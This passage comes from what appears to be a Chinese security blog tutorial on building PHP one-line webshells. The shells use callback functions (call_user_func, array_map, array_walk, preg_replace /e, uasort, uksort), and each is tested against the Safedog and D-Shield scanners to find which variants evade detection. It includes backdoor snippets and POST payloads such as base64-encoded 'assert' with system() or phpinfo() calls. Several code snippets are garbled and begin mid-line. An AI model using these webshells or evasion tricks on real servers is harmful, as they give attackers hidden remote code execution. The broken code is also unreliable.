但是换一种方式将`$_POST['x']`当做参数传递的话就都翻车了：
安全狗 | D盾  
---|---  
1 个安全风险 assert PHP一句话后门 | 已知后门  
###  回调函数
常⽤的回调函数⼤部分都无法绕过 WAF 了。
**call_user_func()**
    call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。
安全狗 | D盾  
---|---  
1 个安全风险 call_user_func后门 | 级别 5 (内藏) call_user_func后门  
**call_user_func_array()**
    call_user_func_array ( callable $callback , array $param_arr )
把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。
不过安全狗和 D 盾都对这个函数进行检测了：
安全狗 | D盾  
---|---  
1 个安全风险 call_user_func_array回调后门 | 级别 4 call_user_func_array  
**array_filter()**
    array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )
依次将 `array` 数组中的每个值传递到 `callback` 函数。
如果 `callback` 函数返回 true，则 `array` 数组的当前值会被包含在返回的结果数组中，数组的键名保留不变。
依然无法 Bypass
安全狗 | D盾  
---|---  
1 个安全风险 array_filter后门 | 级别 5 array_filter后门  
assert 手动 Base64 编码后传入，这样还会把 assert 关键词给去掉了：
安全狗 | D盾  
---|---  
1 个安全风险 array_filter后门 | 级别 4 array_filter 参数  
**array_map()**
    array_map(myfunction,array1,array2,array3...)
参数 | 描述  
---|---  
_myfunction_ | 必需。用户自定义函数的名称，或者是 null。  
_array1_ | 必需。规定数组。  
_array2_ | 可选。规定数组。  
_array3_ | 可选。规定数组。  
array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。和 arrray_walk() 函数差不多：
        # payload  e=YXNzZXJ0&pass=system('dir');
依然被杀了，检测结果如下：
安全狗 | D盾  
---|---  
1 个安全风险 array_map执行 | 级别 5 已知后门  
**array_walk()**
    array_walk(array,myfunction,parameter...)
array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。
参数 | 描述  
---|---  
_array_ | 必需。规定数组。  
_myfunction_ | 必需。用户自定义函数的名称。  
_userdata_ ,… | 可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。  
简单案例：
    ";}$a=array("a"=>"red","b"=>"green","c"=>"blue");array_walk($a,"myfunction");?>
运行结果如下：
    The key a has the value red
    The key b has the value green
    The key c has the value blue
根据这个特性手动来写一个 webshell 试试看：
    "ert");
        array_walk($a,"sqlsec");
    ?>
这个 array_walk 有点复杂，这里用的是回调函数和自定义函数结合的姿势了。
安全狗 | D盾  
---|---  
0 个安全风险 | 级别 2 (可疑)变量函数  
看了下网上其他姿势：
     '|.*|e',);
        array_walk($arr, $e, '');
    ?>
此时提交如下 payload 的话：
    shell.php?e=preg_replace
最后就相当于执行了如下语句：
    preg_replace('|.*|e',$_POST['x'],'')
这个时候只需要 POST `x=phpinfo();` 即可。这种主要是利用了 preg_replace 的 /e 模式进行代码执行。
不过这种方法已经凉了，安全狗和 D 盾均可以识别，而且这种 preg_replace 三参数后门的 `/e`模式 PHP5.5 以后就废弃了：
安全狗 | D盾  
---|---  
1 个安全风险 array_walk执行 | 级别 5 已知后门  
不过 PHP 止中不止 preg_replace 函数可以执行 eval 的功能，还有下面几个类似的：
**mb_ereg_replace**
    mb_ereg_replace ( string $pattern , string $replacement , string $string [, string $option = "msr" ] ) : string
类似于 preg_replace 函数一样，也可以通过 e 修饰符来执行命令：
**preg_filter**
    mixed preg_filter ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
preg_filter() 等价于 preg_replace() ，但它仅仅返回与目标匹配的结果。
只是比较可惜，都无法过狗和D盾了。不过问题不大，感兴趣小伙伴可以去查阅 PHP 官方文档，还是可以找到类似函数的，可以过狗和D盾
**array_walk_recursive()**
    array_walk_recursive(array,myfunction,parameter...)
array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。该函数与
array_walk()函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。
参数 | 描述  
---|---  
_array_ | 必需。规定数组。  
_myfunction_ | 必需。用户自定义函数的名称。  
_userdata_ ,… | 可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。  
     '|.*|e',);
        array_walk_recursive($arr, $e, '');
    ?>
安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
**array_reduce()**
    array_reduce(array,myfunction,initial)
array_reduce() 函数向用户自定义函数发送数组中的值，并返回一个字符串。
参数 | 描述  
---|---  
_array_ | 必需。规定数组。  
_myfunction_ | 必需。规定函数的名称。  
_initial_ | 可选。规定发送到函数的初始值。  
POST 提交如下数据：`e=assert&x=phpinfo();` 但是目前已经无法过狗了。
安全狗 | D盾  
---|---  
1 个安全风险 array_reduce执行 | 级别 5 已知后门  
**array_udiff()**
    array_diff(array1,array2,myfunction...);
array_diff() 函数返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的键值。在返回的数组中，键名保持不变。
参数 | 描述  
---|---  
_array1_ | 必需。与其他数组进行比较的第一个数组。  
_array2_ | 必需。与第一个数组进行比较的数组。  
myfunction | 回调对照函数。  
POST 提交如下数据：`e=assert&x=phpinfo();` 但是目前已经无法过狗。
安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
**uasort()**
    uasort(array,myfunction);
uasort() 函数使用用户自定义的比较函数对数组排序，并保持索引关联（不为元素分配新的键）。如果成功则返回 TRUE，否则返回
FALSE。该函数主要用于对那些单元顺序很重要的结合数组进行排序。
参数 | 描述  
---|---  
_array_ | 必需。规定要进行排序的数组。  
_myfunction_ | 可选。定义可调用比较函数的字符串。如果第一个参数小于等于或大于第二个参数，那么比较函数必须返回一个小于等于或大于 0 的整数。  
POST 提交的数据如下：`e=YXNzZXJ0&x=phpinfo();` 这个后门在 PHP 5.3之后可以正常运行，5.3 会提示 assert
只能有1个参数，这是因为 assert 多参数是后面才开始新增的内容，PHP 5.4.8 及更高版本的用户也可以提供第四个可选参数，如果设置了，用于将
`description` 指定到 **assert()** 。
安全狗 | D盾  
---|---  
1 个安全风险 PHP回调木马 | 级别 4 uasort 参数  
**uksort()**
    uksort(array,myfunction);
uksort() 函数通过用户自定义的比较函数对数组按键名进行排序。
参数 | 描述  
---|---  
_array_ | 必需。规定要进行排序的数组。  
_myfunction_ | 可选。定义可调用比较函数的字符串。如果第一个参数小于等于或大于第二个参数，那么比较函数必须返回一个小于等于或大于 0 的整数。  
     1, $_REQUEST['x'] => 2);    uksort($arr, $e);?>
POST 的内容如下：`e=assert&x=phpinfo();` 该方法也不能 Bypass 安全狗了：